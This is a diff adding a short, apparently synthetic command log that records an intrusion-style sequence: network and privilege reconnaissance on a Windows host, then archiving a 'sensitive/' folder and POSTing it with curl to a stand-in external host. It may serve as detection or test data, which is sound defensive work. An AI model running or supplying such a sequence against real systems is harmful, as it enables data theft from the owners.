@@ -1,0 +1,7 @@
+2026-11-15T05:25:14.119197 | ipconfig
+2026-11-15T05:25:14.119197 | netstat -ano
+2026-11-15T05:25:14.119197 | arp -a
+2026-11-15T05:35:14.119197 | whoami /priv
+2026-11-15T05:35:14.119197 | net localgroup administrators
+2026-11-15T05:40:14.119197 | tar -czf data.tar.gz sensitive/
+2026-11-15T05:40:14.119197 | curl -X POST https://external-host/upload
